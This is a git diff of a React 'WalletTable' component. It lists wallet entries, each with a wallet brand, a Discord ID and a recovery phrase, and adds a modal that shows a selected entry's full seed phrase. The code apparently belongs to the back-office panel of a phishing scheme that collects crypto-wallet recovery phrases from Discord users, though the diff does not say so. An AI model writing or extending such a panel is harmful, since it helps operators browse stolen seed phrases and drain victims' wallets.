@@ -5,6 +5,7 @@ import { Table } from "react-bootstrap";
 import { TABLEHEADERS } from "../Modules/Listing";
 
 import axios from "axios";
+import ViewWallet from "./ViewWallet";
 
 export default function WalletTable(props) {
   // ACTIVE TABLES
@@ -34,13 +35,44 @@ export default function WalletTable(props) {
     getAll();
   }, []);
 
-  // TREZOR
-  const ii = table_wallets.filter((e) => {
-    return e.wallet === activeTable;
+  // FILTER ACCORDING TO THE PRESENT TABLE
+  const qq = [];
+
+  table_wallets.map((data) => {
+    if (data.wallet === activeTable) {
+      qq.push(data);
+    } else if (activeTable === "All") {
+      qq.push(data);
+    }
+    return data;
   });
 
+  // VIEW MODAL FOR THE SELECTED WALLET
+  const [viewWallet, setViewWallet] = useState(false);
+
+  // THE WALLET VIEWD LISTING
+  const [nameWallet, setNameWallet] = React.useState("");
+  const [recoveryPhraseWallet, setRecoveryPhraseWallet] = React.useState("");
+  const [discordIDWallet, setDiscordIDWalletWallet] = React.useState("");
+
+  // VIEW SELECTED WALLTE HANDLE
+  const openWallet = (t) => {
+    setViewWallet(true);
+    setNameWallet(t.wallet);
+    setRecoveryPhraseWallet(t.recoveryPhrase.join(" "));
+    setDiscordIDWalletWallet(t.discordID);
+  };
+
+  const prop2 = {
+    viewWallet,
+    setViewWallet,
+    nameWallet,
+    recoveryPhraseWallet,
+    discordIDWallet,
+  };
+
   return (
-    <div className="my-4">
+    <div className="my-1">
       <Table striped bordered hover>
         <thead>
           <tr>
@@ -50,9 +82,9 @@ export default function WalletTable(props) {
           </tr>
         </thead>
         <tbody>
-          {ii.map((t, index) => {
+          {qq.map((t, index) => {
             return (
-              <tr key={index}>
+              <tr key={index} onClick={() => openWallet(t)}>
                 <td>{index}</td>
                 <td>{t.wallet}</td>
                 <td>{t.discordID}</td>
@@ -62,6 +94,9 @@ export default function WalletTable(props) {
           })}
         </tbody>
       </Table>
+
+      {/* VIEW THE SELECTED WALLET */}
+      <ViewWallet {...prop2} />
     </div>
   );
 }
